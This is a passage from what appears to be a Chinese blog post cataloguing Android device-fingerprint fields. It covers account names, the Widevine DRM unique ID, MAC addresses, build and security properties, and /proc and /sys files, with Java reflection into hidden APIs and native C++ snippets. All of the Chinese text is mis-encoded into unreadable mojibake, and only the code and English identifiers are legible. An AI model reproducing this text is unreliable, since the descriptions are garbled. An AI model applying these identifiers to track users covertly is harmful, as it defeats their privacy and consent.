è·å–ç³»ç»Ÿå±æ€§ï¼ˆå¸ƒå°”å‹ï¼‰</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getBoolean</span> <span class="operator">=</span> systemProperties.getMethod(<span class="string">&quot;getBoolean&quot;</span>, String.class, <span class="type">boolean</span>.class);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">value</span> <span class="operator">=</span> (Boolean) getBoolean.invoke(<span class="literal">null</span>, <span class="string">&quot;property.key&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="6-è´¦æˆ·ä¿¡æ¯-AccountCollector"><a href="#6-è´¦æˆ·ä¿¡æ¯-AccountCollector" class="headerlink" title="6. è´¦æˆ·ä¿¡æ¯ (AccountCollector)"></a>6. è´¦æˆ·ä¿¡æ¯ (AccountCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>Total accounts</code></td><td>è´¦æˆ·æ€»æ•°</td><td><code>AccountManager.getAccounts().length</code></td></tr><tr><td><code>Account Type</code></td><td>è´¦æˆ·ç±»å‹</td><td><code>Account.type</code></td></tr><tr><td><code>Account Name</code></td><td>è´¦æˆ·åç§°</td><td><code>Account.name</code></td></tr></tbody></table><p><strong>æƒé™è¦æ±‚</strong>ï¼šAndroid 6.0+ éœ€è¦ <code>GET_ACCOUNTS</code> æƒé™</p><h3 id="7-åª’ä½“ä¿¡æ¯-MediaCollector"><a href="#7-åª’ä½“ä¿¡æ¯-MediaCollector" class="headerlink" title="7. åª’ä½“ä¿¡æ¯ (MediaCollector)"></a>7. åª’ä½“ä¿¡æ¯ (MediaCollector)</h3><h4 id="éŸ³é‡ä¿¡æ¯"><a href="#éŸ³é‡ä¿¡æ¯" class="headerlink" title="éŸ³é‡ä¿¡æ¯"></a>éŸ³é‡ä¿¡æ¯</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>VolumeInfo</code></td><td>éŸ³ä¹æµéŸ³é‡</td><td><code>AudioManager.getStreamVolume(AudioManager.STREAM_MUSIC)</code></td></tr></tbody></table><h4 id="DRM-ä¿¡æ¯"><a href="#DRM-ä¿¡æ¯" class="headerlink" title="DRM ä¿¡æ¯"></a>DRM ä¿¡æ¯</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>MediaDrm Device Unique ID</code></td><td>DRM è®¾å¤‡å”¯ä¸€ ID</td><td><code>MediaDrm.getPropertyByteArray(MediaDrm.PROPERTY_DEVICE_UNIQUE_ID)</code></td></tr></tbody></table><p><strong>DRM UUID</strong>ï¼šWidevine UUID &#x3D; <code>0xedef8ba979d64aceL, 0xa3c827dcd51d21edL</code></p><h3 id="8-ä¼ æ„Ÿå™¨ä¿¡æ¯-SensorCollector"><a href="#8-ä¼ æ„Ÿå™¨ä¿¡æ¯-SensorCollector" class="headerlink" title="8. ä¼ æ„Ÿå™¨ä¿¡æ¯ (SensorCollector)"></a>8. ä¼ æ„Ÿå™¨ä¿¡æ¯ (SensorCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>Sensor List</code></td><td>æ‰€æœ‰ä¼ æ„Ÿå™¨åˆ—è¡¨</td><td><code>SensorManager.getSensorList(Sensor.TYPE_ALL)</code></td></tr></tbody></table><h3 id="9-OpenGL-æ¸²æŸ“å™¨ä¿¡æ¯-glendererCollector"><a href="#9-OpenGL-æ¸²æŸ“å™¨ä¿¡æ¯-glendererCollector" class="headerlink" title="9. OpenGL æ¸²æŸ“å™¨ä¿¡æ¯ (glendererCollector)"></a>9. OpenGL æ¸²æŸ“å™¨ä¿¡æ¯ (glendererCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>Renderer</code></td><td>æ¸²æŸ“å™¨åç§°ï¼ˆæ˜¾å¡å‹å·ï¼‰</td><td><code>GLES20.glGetString(GLES20.GL_RENDERER)</code></td></tr><tr><td><code>Vendor</code></td><td>æ¸²æŸ“å™¨å‚å•†</td><td><code>GLES20.glGetString(GLES20.GL_VENDOR)</code></td></tr><tr><td><code>Version</code></td><td>OpenGL ç‰ˆæœ¬</td><td><code>GLES20.glGetString(GLES20.GL_VERSION)</code></td></tr></tbody></table><p><strong>å®ç°æ–¹å¼</strong>ï¼šé€šè¿‡ EGL åˆ›å»ºç¦»å±æ¸²æŸ“ä¸Šä¸‹æ–‡è·å– OpenGL ä¿¡æ¯</p><h3 id="10-ç”µæ± ä¿¡æ¯-batteryCollector"><a href="#10-ç”µæ± ä¿¡æ¯-batteryCollector" class="headerlink" title="10. ç”µæ± ä¿¡æ¯ (batteryCollector)"></a>10. ç”µæ± ä¿¡æ¯ (batteryCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>Battery Level</code></td><td>ç”µæ± ç”µé‡ç™¾åˆ†æ¯”</td><td><code>Intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)</code></td></tr><tr><td><code>Status</code></td><td>å……ç”µçŠ¶æ€</td><td><code>Intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)</code></td></tr><tr><td><code>Plugged</code></td><td>æ’æ‹”çŠ¶æ€</td><td><code>Intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)</code></td></tr><tr><td><code>Health</code></td><td>å¥åº·çŠ¶æ€</td><td><code>Intent.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)</code></td></tr><tr><td><code>Voltage</code></td><td>ç”µå‹ï¼ˆæ¯«ä¼ï¼‰</td><td><code>Intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1)</code></td></tr><tr><td><code>Temperature</code></td><td>æ¸©åº¦ï¼ˆ0.1Â°Cï¼‰</td><td><code>Intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1)</code></td></tr></tbody></table><p><strong>å®ç°æ–¹å¼</strong>ï¼šé€šè¿‡ç²˜æ€§å¹¿æ’­ <code>ACTION_BATTERY_CHANGED</code> è·å–ç”µæ± çŠ¶æ€</p><h3 id="11-å†…å­˜ä¿¡æ¯-MemoryCollector"><a href="#11-å†…å­˜ä¿¡æ¯-MemoryCollector" class="headerlink" title="11. å†…å­˜ä¿¡æ¯ (MemoryCollector)"></a>11. å†…å­˜ä¿¡æ¯ (MemoryCollector)</h3><h4 id="RAM-ä¿¡æ¯"><a href="#RAM-ä¿¡æ¯" class="headerlink" title="RAM ä¿¡æ¯"></a>RAM ä¿¡æ¯</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>ram_total_bytes</code></td><td>æ€»å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.MemoryInfo.totalMem</code></td></tr><tr><td><code>ram_available_bytes</code></td><td>å¯ç”¨å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.MemoryInfo.availMem</code></td></tr><tr><td><code>ram_used_bytes</code></td><td>å·²ä½¿ç”¨å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>totalMem - availMem</code></td></tr><tr><td><code>ram_usage_percent</code></td><td>å†…å­˜ä½¿ç”¨ç‡</td><td><code>(usedMem / totalMem) * 100</code></td></tr><tr><td><code>ram_low_memory</code></td><td>ä½å†…å­˜æ ‡å¿—</td><td><code>ActivityManager.MemoryInfo.lowMemory</code></td></tr><tr><td><code>ram_threshold_bytes</code></td><td>ä½å†…å­˜é˜ˆå€¼ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.MemoryInfo.threshold</code></td></tr><tr><td><code>ram_hidden_app_threshold_bytes</code></td><td>éšè—åº”ç”¨é˜ˆå€¼ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.MemoryInfo.hiddenAppThreshold</code> (Hidden)</td></tr><tr><td><code>ram_secondary_server_threshold_bytes</code></td><td>äºŒçº§æœåŠ¡å™¨é˜ˆå€¼ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.MemoryInfo.secondaryServerThreshold</code> (Hidden)</td></tr><tr><td><code>ram_memory_class_mb</code></td><td>æ ‡å‡†å†…å­˜ç±»ï¼ˆMBï¼‰</td><td><code>ActivityManager.getMemoryClass()</code></td></tr><tr><td><code>ram_large_memory_class_mb</code></td><td>å¤§å†…å­˜ç±»ï¼ˆMBï¼‰</td><td><code>ActivityManager.getLargeMemoryClass()</code></td></tr><tr><td><code>app_memory_total_bytes</code></td><td>åº”ç”¨æ€»å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.getMemoryInfo(int uid, MemoryInfo)</code> (Hidden)</td></tr><tr><td><code>app_memory_available_bytes</code></td><td>åº”ç”¨å¯ç”¨å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>ActivityManager.getMemoryInfo(int uid, MemoryInfo)</code> (Hidden)</td></tr><tr><td><code>app_heap_max_bytes</code></td><td>Java å †æœ€å¤§å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>Runtime.maxMemory()</code></td></tr><tr><td><code>app_heap_total_bytes</code></td><td>Java å †æ€»å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>Runtime.totalMemory()</code></td></tr><tr><td><code>app_heap_free_bytes</code></td><td>Java å †ç©ºé—²å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>Runtime.freeMemory()</code></td></tr><tr><td><code>app_heap_used_bytes</code></td><td>Java å †å·²ä½¿ç”¨å†…å­˜ï¼ˆå­—èŠ‚ï¼‰</td><td><code>totalMemory - freeMemory</code></td></tr><tr><td><code>app_heap_usage_percent</code></td><td>Java å †ä½¿ç”¨ç‡</td><td><code>(usedMemory / maxMemory) * 100</code></td></tr></tbody></table><h4 id="ROM-ä¿¡æ¯"><a href="#ROM-ä¿¡æ¯" class="headerlink" title="ROM ä¿¡æ¯"></a>ROM ä¿¡æ¯</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>internal_storage_total_bytes</code></td><td>å†…éƒ¨å­˜å‚¨æ€»ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰</td><td><code>StatFs.getBlockCountLong() * getBlockSizeLong()</code></td></tr><tr><td><code>internal_storage_available_bytes</code></td><td>å†…éƒ¨å­˜å‚¨å¯ç”¨ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰</td><td><code>StatFs.getAvailableBlocksLong() * getBlockSizeLong()</code></td></tr><tr><td><code>internal_storage_used_bytes</code></td><td>å†…éƒ¨å­˜å‚¨å·²ä½¿ç”¨ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰</td><td><code>totalSize - availableSize</code></td></tr><tr><td><code>internal_storage_usage_percent</code></td><td>å†…éƒ¨å­˜å‚¨ä½¿ç”¨ç‡</td><td><code>(usedSize / totalSize) * 100</code></td></tr><tr><td><code>external_storage_total_bytes</code></td><td>å¤–éƒ¨å­˜å‚¨æ€»ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰</td><td><code>StatFs.getBlockCountLong() * getBlockSizeLong()</code></td></tr><tr><td><code>external_storage_available_bytes</code></td><td>å¤–éƒ¨å­˜å‚¨å¯ç”¨ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰</td><td><code>StatFs.getAvailableBlocksLong() * getBlockSizeLong()</code></td></tr><tr><td><code>external_storage_used_bytes</code></td><td>å¤–éƒ¨å­˜å‚¨å·²ä½¿ç”¨ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰</td><td><code>totalSize - availableSize</code></td></tr><tr><td><code>external_storage_usage_percent</code></td><td>å¤–éƒ¨å­˜å‚¨ä½¿ç”¨ç‡</td><td><code>(usedSize / totalSize) * 100</code></td></tr><tr><td><code>external_storage_state</code></td><td>å¤–éƒ¨å­˜å‚¨çŠ¶æ€</td><td><code>Environment.getExternalStorageState()</code></td></tr></tbody></table><p><strong>Hidden API è°ƒç”¨</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å– MemoryInfo éšè—å­—æ®µ</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hiddenAppThresholdField</span> <span class="operator">=</span> ActivityManager.MemoryInfo.class.getDeclaredField(<span class="string">&quot;hiddenAppThreshold&quot;</span>);</span><br><span class="line">hiddenAppThresholdField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">hiddenAppThreshold</span> <span class="operator">=</span> hiddenAppThresholdField.getLong(memoryInfo);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ç‰¹å®š UID çš„å†…å­˜ä¿¡æ¯</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getMemoryInfoForUidMethod</span> <span class="operator">=</span> ActivityManager.class.getDeclaredMethod(<span class="string">&quot;getMemoryInfo&quot;</span>, <span class="type">int</span>.class, ActivityManager.MemoryInfo.class);</span><br><span class="line">getMemoryInfoForUidMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">getMemoryInfoForUidMethod.invoke(activityManager, uid, memoryInfo);</span><br></pre></td></tr></table></figure><h2 id="ğŸ“‹-Native-å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…"><a href="#ğŸ“‹-Native-å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…" class="headerlink" title="ğŸ“‹ Native å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…"></a>ğŸ“‹ Native å±‚æŒ‡çº¹é‡‡é›†å­—æ®µè¯¦æƒ…</h2><h3 id="1-ç³»ç»Ÿå±æ€§ä¿¡æ¯-SystemPropertyCollector"><a href="#1-ç³»ç»Ÿå±æ€§ä¿¡æ¯-SystemPropertyCollector" class="headerlink" title="1. ç³»ç»Ÿå±æ€§ä¿¡æ¯ (SystemPropertyCollector)"></a>1. ç³»ç»Ÿå±æ€§ä¿¡æ¯ (SystemPropertyCollector)</h3><p>é€šè¿‡ <code>__system_property_get()</code> è·å–ç³»ç»Ÿå±æ€§ï¼Œä¸ Java å±‚ç±»ä¼¼ä½†ç›´æ¥ä» Native å±‚è¯»å–ï¼š</p><h4 id="USB-é…ç½®ç›¸å…³-1"><a href="#USB-é…ç½®ç›¸å…³-1" class="headerlink" title="USB é…ç½®ç›¸å…³"></a>USB é…ç½®ç›¸å…³</h4><ul><li><code>sys.usb.config</code></li><li><code>sys.usb.state</code></li><li><code>persist.sys.usb.config</code></li><li><code>persist.sys.usb.qmmi.func</code></li><li><code>vendor.usb.mimode</code></li><li><code>persist.vendor.usb.config</code></li></ul><h4 id="å®‰å…¨ç›¸å…³-1"><a href="#å®‰å…¨ç›¸å…³-1" class="headerlink" title="å®‰å…¨ç›¸å…³"></a>å®‰å…¨ç›¸å…³</h4><ul><li><code>ro.debuggable</code></li><li><code>init.svc.adbd</code></li><li><code>ro.secure</code></li><li><code>ro.boot.flash.locked</code></li><li><code>sys.oem_unlock_allowed</code></li></ul><h4 id="Build-ID-ç›¸å…³-1"><a href="#Build-ID-ç›¸å…³-1" class="headerlink" title="Build ID ç›¸å…³"></a>Build ID ç›¸å…³</h4><ul><li><code>ro.build.id</code></li><li><code>ro.build.build.id</code></li><li><code>ro.bootimage.build.id</code></li><li><code>ro.odm.build.id</code></li><li><code>ro.product.build.id</code></li><li><code>ro.system_ext.build.id</code></li><li><code>ro.system.build.id</code></li><li><code>ro.vendor.build.id</code></li></ul><h4 id="SDK-ç‰ˆæœ¬"><a href="#SDK-ç‰ˆæœ¬" class="headerlink" title="SDK ç‰ˆæœ¬"></a>SDK ç‰ˆæœ¬</h4><ul><li><code>ro.build.version.sdk</code></li></ul><h4 id="å®‰å…¨è¡¥ä¸-1"><a href="#å®‰å…¨è¡¥ä¸-1" class="headerlink" title="å®‰å…¨è¡¥ä¸"></a>å®‰å…¨è¡¥ä¸</h4><ul><li><code>ro.build.version.security_patch</code></li></ul><h4 id="å…¶ä»–ç³»ç»Ÿä¿¡æ¯-1"><a href="#å…¶ä»–ç³»ç»Ÿä¿¡æ¯-1" class="headerlink" title="å…¶ä»–ç³»ç»Ÿä¿¡æ¯"></a>å…¶ä»–ç³»ç»Ÿä¿¡æ¯</h4><ul><li><code>ro.boot.vbmeta.digest</code></li><li><code>ro.netflix.bsp_rev</code></li><li><code>gsm.version.baseband</code></li></ul><h4 id="Build-æ—¥æœŸ-UTC-1"><a href="#Build-æ—¥æœŸ-UTC-1" class="headerlink" title="Build æ—¥æœŸ UTC"></a>Build æ—¥æœŸ UTC</h4><ul><li><code>ro.build.date.utc</code></li><li><code>ro.build.build.date.utc</code></li><li><code>ro.bootimage.build.date.utc</code></li><li><code>ro.odm.build.date.utc</code></li><li><code>ro.product.build.date.utc</code></li><li><code>ro.system_ext.build.date.utc</code></li><li><code>ro.system.build.date.utc</code></li><li><code>ro.vendor.build.date.utc</code></li></ul><h4 id="Display-ID-å’Œ-Tags-1"><a href="#Display-ID-å’Œ-Tags-1" class="headerlink" title="Display ID å’Œ Tags"></a>Display ID å’Œ Tags</h4><ul><li><code>ro.build.display.id</code></li><li><code>ro.build.tags</code></li><li><code>ro.build.build.tags</code></li><li><code>ro.bootimage.build.tags</code></li><li><code>ro.odm.build.tags</code></li><li><code>ro.product.build.tags</code></li><li><code>ro.system_ext.build.tags</code></li><li><code>ro.system.build.tags</code></li><li><code>ro.vendor.build.tags</code></li></ul><h4 id="Build-Host-å’Œ-User-1"><a href="#Build-Host-å’Œ-User-1" class="headerlink" title="Build Host å’Œ User"></a>Build Host å’Œ User</h4><ul><li><code>ro.build.host</code></li><li><code>ro.build.user</code></li><li><code>ro.config.ringtone</code></li><li><code>ro.miui.ui.version.name</code></li></ul><h4 id="Build-Version-Incremental-1"><a href="#Build-Version-Incremental-1" class="headerlink" title="Build Version Incremental"></a>Build Version Incremental</h4><ul><li><code>ro.build.version.incremental</code></li><li><code>ro.build.build.version.incremental</code></li><li><code>ro.bootimage.build.version.incremental</code></li><li><code>ro.odm.build.version.incremental</code></li><li><code>ro.product.build.version.incremental</code></li><li><code>ro.system_ext.build.version.incremental</code></li><li><code>ro.system.build.version.incremental</code></li><li><code>ro.vendor.build.version.incremental</code></li></ul><h4 id="Build-Description-1"><a href="#Build-Description-1" class="headerlink" title="Build Description"></a>Build Description</h4><ul><li><code>ro.build.description</code></li></ul><h4 id="Build-Fingerprint-1"><a href="#Build-Fingerprint-1" class="headerlink" title="Build Fingerprint"></a>Build Fingerprint</h4><ul><li><code>ro.build.fingerprint</code></li><li><code>ro.build.build.fingerprint</code></li><li><code>ro.bootimage.build.fingerprint</code></li><li><code>ro.odm.build.fingerprint</code></li><li><code>ro.product.build.fingerprint</code></li><li><code>ro.system_ext.build.fingerprint</code></li><li><code>ro.system.build.fingerprint</code></li><li><code>ro.vendor.build.fingerprint</code></li></ul><h4 id="å…¶ä»–ç³»ç»Ÿå±æ€§"><a href="#å…¶ä»–ç³»ç»Ÿå±æ€§" class="headerlink" title="å…¶ä»–ç³»ç»Ÿå±æ€§"></a>å…¶ä»–ç³»ç»Ÿå±æ€§</h4><ul><li><code>ro.board.platform</code></li><li><code>ro.product.cpu.abi</code></li><li><code>ro.boot.verifiedbootstate</code></li><li><code>ro.boot.vbmeta.device_state</code></li><li><code>ro.treble.enabled</code></li></ul><p><strong>Native API è°ƒç”¨</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/system_properties.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> value[PROP_VALUE_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> len = __system_property_get(<span class="string">&quot;ro.build.id&quot;</span>, value);</span><br></pre></td></tr></table></figure><h3 id="2-DRM-ä¿¡æ¯-DRMCollector"><a href="#2-DRM-ä¿¡æ¯-DRMCollector" class="headerlink" title="2. DRM ä¿¡æ¯ (DRMCollector)"></a>2. DRM ä¿¡æ¯ (DRMCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>Native API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>MediaDrm Device Unique ID (Base64)</code></td><td>DRM è®¾å¤‡å”¯ä¸€ ID (Base64)</td><td><code>AMediaDrm_getPropertyByteArray(mediaDrm, PROPERTY_DEVICE_UNIQUE_ID, &amp;byteArray)</code></td></tr><tr><td><code>MediaDrm Device Unique ID (Hex)</code></td><td>DRM è®¾å¤‡å”¯ä¸€ ID (åå…­è¿›åˆ¶)</td><td>åŒä¸Šï¼Œè½¬æ¢ä¸ºåå…­è¿›åˆ¶</td></tr><tr><td><code>Length</code></td><td>ID é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰</td><td><code>byteArray.length</code></td></tr></tbody></table><p><strong>Native API è°ƒç”¨</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;media/NdkMediaDrm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">AMediaDrm* mediaDrm = <span class="built_in">AMediaDrm_createByUUID</span>(WIDEVINE_UUID);</span><br><span class="line">AMediaDrmByteArray byteArray;</span><br><span class="line"><span class="built_in">AMediaDrm_getPropertyByteArray</span>(mediaDrm, PROPERTY_DEVICE_UNIQUE_ID, &amp;byteArray);</span><br></pre></td></tr></table></figure><h3 id="3-ç½‘ç»œæ¥å£ä¿¡æ¯-MacAddressCollector"><a href="#3-ç½‘ç»œæ¥å£ä¿¡æ¯-MacAddressCollector" class="headerlink" title="3. ç½‘ç»œæ¥å£ä¿¡æ¯ (MacAddressCollector)"></a>3. ç½‘ç»œæ¥å£ä¿¡æ¯ (MacAddressCollector)</h3><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>Native API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>Interface Name</code></td><td>ç½‘ç»œæ¥å£åç§°</td><td><code>getifaddrs()</code> &#x2F; <code>ioctl(SIOCGIFHWADDR)</code></td></tr><tr><td><code>MAC Address</code></td><td>MAC åœ°å€</td><td><code>getifaddrs()</code> (AF_PACKET) &#x2F; <code>ioctl(SIOCGIFHWADDR)</code></td></tr><tr><td><code>IPv4 Address</code></td><td>IPv4 åœ°å€</td><td><code>getifaddrs()</code> (AF_INET) + <code>getnameinfo()</code></td></tr><tr><td><code>IPv6 Address</code></td><td>IPv6 åœ°å€</td><td><code>getifaddrs()</code> (AF_INET6) + <code>getnameinfo()</code></td></tr></tbody></table><p><strong>Native API è°ƒç”¨</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netpacket/packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•1: ä½¿ç”¨ getifaddrs (netlink)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ifaddrs</span>* ifap;</span><br><span class="line"><span class="built_in">getifaddrs</span>(&amp;ifap);</span><br><span class="line"><span class="comment">// éå†è·å– MAC åœ°å€å’Œ IP åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•2: ä½¿ç”¨ ioctl (å¤‡é€‰)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ifreq</span> ifr;</span><br><span class="line"><span class="built_in">ioctl</span>(sockfd, SIOCGIFHWADDR, &amp;ifr);</span><br></pre></td></tr></table></figure><h3 id="4-æ–‡ä»¶æŒ‡çº¹ä¿¡æ¯-NativeFileCollector"><a href="#4-æ–‡ä»¶æŒ‡çº¹ä¿¡æ¯-NativeFileCollector" class="headerlink" title="4. æ–‡ä»¶æŒ‡çº¹ä¿¡æ¯ (NativeFileCollector)"></a>4. æ–‡ä»¶æŒ‡çº¹ä¿¡æ¯ (NativeFileCollector)</h3><h4 id="æ ¸å¿ƒç¡¬ä»¶ä¸å†…æ ¸ç‰¹å¾æ–‡ä»¶"><a href="#æ ¸å¿ƒç¡¬ä»¶ä¸å†…æ ¸ç‰¹å¾æ–‡ä»¶" class="headerlink" title="æ ¸å¿ƒç¡¬ä»¶ä¸å†…æ ¸ç‰¹å¾æ–‡ä»¶"></a>æ ¸å¿ƒç¡¬ä»¶ä¸å†…æ ¸ç‰¹å¾æ–‡ä»¶</h4><table><thead><tr><th>æ–‡ä»¶è·¯å¾„</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>/proc/cpuinfo</code></td><td>CPU ä¿¡æ¯</td></tr><tr><td><code>/proc/version</code></td><td>å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td><code>/proc/meminfo</code></td><td>å†…å­˜ä¿¡æ¯</td></tr><tr><td><code>/proc/iomem</code></td><td>I&#x2F;O å†…å­˜æ˜ å°„</td></tr><tr><td><code>/proc/misc</code></td><td>æ‚é¡¹è®¾å¤‡</td></tr><tr><td><code>/sys/devices/soc0/family</code></td><td>SoC ç³»åˆ—</td></tr><tr><td><code>/sys/devices/soc0/machine</code></td><td>SoC æœºå™¨å‹å·</td></tr><tr><td><code>/sys/class/power_supply/battery/capacity</code></td><td>ç”µæ± å®¹é‡</td></tr><tr><td><code>/sys/class/power_supply/battery/status</code></td><td>ç”µæ± çŠ¶æ€</td></tr></tbody></table><h4 id="ç¯å¢ƒä¸å®‰å…¨æ£€æµ‹æ–‡ä»¶"><a href="#ç¯å¢ƒä¸å®‰å…¨æ£€æµ‹æ–‡ä»¶" class="headerlink" title="ç¯å¢ƒä¸å®‰å…¨æ£€æµ‹æ–‡ä»¶"></a>ç¯å¢ƒä¸å®‰å…¨æ£€æµ‹æ–‡ä»¶</h4><table><thead><tr><th>æ–‡ä»¶è·¯å¾„</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>/proc/sys/kernel/random/boot_id</code></td><td>å¼•å¯¼ ID</td></tr><tr><td><code>/proc/sys/kernel/osrelease</code></td><td>æ“ä½œç³»ç»Ÿç‰ˆæœ¬</td></tr><tr><td><code>/sys/fs/selinux/enforce</code></td><td>SELinux å¼ºåˆ¶æ¨¡å¼</td></tr><tr><td><code>/proc/sys/kernel/random/entropy_avail</code></td><td>å¯ç”¨ç†µ</td></tr><tr><td><code>/proc/uptime</code></td><td>ç³»ç»Ÿè¿è¡Œæ—¶é—´</td></tr><tr><td><code>/sys/class/thermal/thermal_zone0/temp</code></td><td>CPU æ¸©åº¦</td></tr><tr><td><code>/proc/sys/vm/overcommit_memory</code></td><td>å†…å­˜è¿‡åº¦æäº¤è®¾ç½®</td></tr></tbody></table><h4 id="æŒ‚è½½ç‚¹ä¸è¾“å…¥è®¾å¤‡æ–‡ä»¶"><a href="#æŒ‚è½½ç‚¹ä¸è¾“å…¥è®¾å¤‡æ–‡ä»¶" class="headerlink" title="æŒ‚è½½ç‚¹ä¸è¾“å…¥è®¾å¤‡æ–‡ä»¶"></a>æŒ‚è½½ç‚¹ä¸è¾“å…¥è®¾å¤‡æ–‡ä»¶</h4><table><thead><tr><th>æ–‡ä»¶è·¯å¾„</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>/proc/self/mountinfo</code></td><td>æŒ‚è½½ä¿¡æ¯</td></tr><tr><td><code>/proc/mounts</code></td><td>æŒ‚è½½ç‚¹</td></tr><tr><td><code>/proc/filesystems</code></td><td>æ–‡ä»¶ç³»ç»Ÿç±»å‹</td></tr><tr><td><code>/proc/bus/input/devices</code></td><td>è¾“å…¥è®¾å¤‡</td></tr><tr><td><code>/proc/net/unix</code></td><td>Unix åŸŸå¥—æ¥å­—</td></tr></tbody></table><h4 id="å†…æ ¸ä¿¡æ¯ï¼ˆé€šè¿‡-unameï¼‰"><a href="#å†…æ ¸ä¿¡æ¯ï¼ˆé€šè¿‡-unameï¼‰" class="headerlink" title="å†…æ ¸ä¿¡æ¯ï¼ˆé€šè¿‡ unameï¼‰"></a>å†…æ ¸ä¿¡æ¯ï¼ˆé€šè¿‡ unameï¼‰</h4><table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>Native API è°ƒç”¨</th></tr></thead><tbody><tr><td><code>System 